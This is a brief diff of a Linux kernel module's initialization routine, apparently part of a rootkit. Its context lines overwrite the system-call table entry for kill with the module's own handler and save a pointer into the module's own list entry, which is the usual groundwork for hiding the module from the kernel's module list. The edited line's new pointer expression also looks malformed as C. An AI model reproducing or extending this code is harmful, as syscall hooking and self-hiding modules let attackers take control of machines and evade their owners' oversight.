@@ -113,7 +113,7 @@ int __init m_init(void) {
 	sctable[__NR_kill] = m_sys_kill;
 
     current_mod = &__this_module;
-	temp_module_list = &(current_mod)->list.prev;
+	temp_module_list = &(current_mod->list)->prev;
 
 	return 0;
 }
